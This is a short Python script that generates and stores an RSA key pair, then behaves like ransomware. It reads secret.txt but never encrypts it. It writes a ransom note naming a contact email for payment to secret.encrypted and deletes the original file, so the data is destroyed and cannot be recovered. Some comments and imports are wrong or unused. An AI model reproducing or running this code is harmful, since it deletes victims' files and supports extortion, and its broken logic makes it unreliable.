import cryptography

# generating keys
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import rsa
private_key = rsa.generate_private_key(
	public_exponent=65537,
	key_size=2048,
	backend=default_backend()
)
public_key = private_key.public_key()

# storing private key

from cryptography.hazmat.primitives import serialization
pem = private_key.private_bytes(
	encoding=serialization.Encoding.PEM,
	format=serialization.PrivateFormat.PKCS8,
	encryption_algorithm=serialization.NoEncryption()
)

with open(b'private_key.pem', 'wb') as f:
	f.write(pem)
 
# storing private key

from cryptography.hazmat.primitives import serialization

pem = public_key.public_bytes( 
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo,
)

with open(b'public_key.pem', 'wb') as f:
        f.write(pem)

#---

# reading private key
#from cryptography.hazmat.backends import default_backend
#from cryptography.hazmat.primitives import serializtion

with open(b'private_key.pem', 'rb') as key_file:
	private_key = serialization.load_pem_private_key(
		key_file.read(),
		password=None,
		backend=default_backend()
)

# reading public key 

with open(b'public_key.pem', 'rb') as key_file:
        public_key = serialization.load_pem_public_key( 
                key_file.read(),
                backend=default_backend()
)


#---

#encryption
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding

f = open('secret.txt', 'rb')
message = f.read()
f.close()

encrypted = 'your data has been encrypted, please contact haxorboi@gmail.com to recieve payment info and decryption key'
f = open('secret.encrypted', 'w')
f.write(encrypted)
f.close()

import os
if os.path.exists("secret.txt"):
     os.remove("secret.txt")
else:
     print("This file doesn't exist")
